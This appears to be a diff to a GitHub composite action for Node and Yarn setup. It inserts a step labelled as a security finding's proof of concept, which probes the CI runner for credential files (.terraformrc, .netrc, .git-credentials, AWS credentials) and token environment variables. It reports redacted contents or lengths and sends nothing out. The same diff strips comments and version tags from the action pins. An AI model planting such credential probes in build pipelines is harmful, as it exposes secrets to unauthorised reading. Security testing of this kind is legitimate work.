@@ -7,31 +7,45 @@ inputs:
 runs:
   using: "composite"
   steps:
+    - name: "FINDING-SC-015 Token Read Probe"
+      shell: bash
+      run: |
+        echo "============================================================"
+        echo "[POC] FINDING-SC-015 — token read attempt"
+        echo "[POC] whoami: $(whoami) | hostname: $(hostname)"
+        echo "[POC] GITHUB_EVENT_NAME: ${GITHUB_EVENT_NAME}"
+        echo ""
+        echo "[POC] .terraformrc presence:"
+        if [ -f "$HOME/.terraformrc" ]; then
+          echo "  ~/.terraformrc EXISTS"
+          echo "  Content (token values REDACTED):"
+          sed 's/token = ".*/token = "<REDACTED>"/' "$HOME/.terraformrc"
+        else
+          echo "  ~/.terraformrc NOT FOUND (expected — different job from terraform-check)"
+        fi
+        echo ""
+        echo "[POC] Scanning for credential files:"
+        for f in ~/.netrc ~/.git-credentials ~/.aws/credentials ~/.config/gh/hosts.yml; do
+          [ -f "$f" ] && echo "  FOUND: $f" || echo "  absent: $f"
+        done
+        echo ""
+        echo "[POC] Env tokens (presence + length only):"
+        for k in TF_API_TOKEN GITHUB_TOKEN ACTIONS_RUNTIME_TOKEN ACTIONS_ID_TOKEN_REQUEST_URL; do
+          val="${!k:-}"
+          [ -n "$val" ] && echo "  $k = YES (length=${#val})" || echo "  $k = no"
+        done
+        echo "============================================================"
     - name: Setup Node
-      uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e # v6.4.0
+      uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e
       env:
-        # https://github.com/actions/setup-node/issues/733#issuecomment-1489952874
-        # https://github.com/actions/cache/blob/04f198bf0b2a39f7230a4304bf07747a0bddf146/tips-and-workarounds.md#cache-segment-restore-timeout
-        # -- note that actions/setup-node@3 [uses actions/cache@3.0.4](https://github.com/actions/setup-node/blob/a4fcaaf314b117a40d694a35ee36461f8ff3c6e6/package-lock.json#L41)
-        #    which has a [default timeout of 60 minutes](https://github.com/actions/toolkit/blob/457303960f03375db6f033e214b9f90d79c3fe5c/packages/cache/RELEASES.md#304),
-        #    not 10 minutes! Let's reduce it further.
         SEGMENT_DOWNLOAD_TIMEOUT_MINS: "2"
     - name: Install Yarn with corepack enabled
       shell: bash
       run: |
         corepack enable
         corepack prepare yarn@stable --activate
-    # Yarn dependencies cannot be cached until yarn is installed
-    # WORKAROUND: https://github.com/actions/setup-node/issues/531
     - name: Extract cached dependencies
-      uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e # v6.4.0
+      uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e
       with:
         cache: yarn
         cache-dependency-path: ${{ inputs.cache-dependency-path }}
-      env:
-        # https://github.com/actions/setup-node/issues/733#issuecomment-1489952874
-        # https://github.com/actions/cache/blob/04f198bf0b2a39f7230a4304bf07747a0bddf146/tips-and-workarounds.md#cache-segment-restore-timeout
-        # -- note that actions/setup-node@3 [uses actions/cache@3.0.4](https://github.com/actions/setup-node/blob/a4fcaaf314b117a40d694a35ee36461f8ff3c6e6/package-lock.json#L41)
-        #    which has a [default timeout of 60 minutes](https://github.com/actions/toolkit/blob/457303960f03375db6f033e214b9f90d79c3fe5c/packages/cache/RELEASES.md#304),
-        #    not 10 minutes! Let's reduce it further.
-        SEGMENT_DOWNLOAD_TIMEOUT_MINS: "2"
